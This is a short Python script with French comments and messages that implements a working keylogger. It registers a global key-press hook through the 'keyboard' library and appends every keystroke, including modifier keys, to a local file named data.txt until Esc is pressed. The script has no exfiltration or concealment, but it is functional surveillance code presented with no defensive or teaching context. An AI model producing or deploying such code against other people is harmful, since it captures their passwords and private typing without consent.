import keyboard

path = "data.txt"

print("Keylogger actif. Appuyez sur 'Esc' pour arrêter.")

def enregistrer_frappe(event):
    with open(path, "a") as fichier:
        if event.name == "space":
            fichier.write(" ")
        elif event.name == "enter":
            fichier.write("\n")
        elif len(event.name) == 1:
            fichier.write(event.name)
        else:
            fichier.write(f"[{event.name}]")  # pour les touches comme shift, ctrl, etc.

# Démarre l'écoute globale
keyboard.on_press(enregistrer_frappe)

# Boucle qui attend que 'esc' soit pressé pour arrêter
keyboard.wait('esc')
print("Keylogger arrêté.")
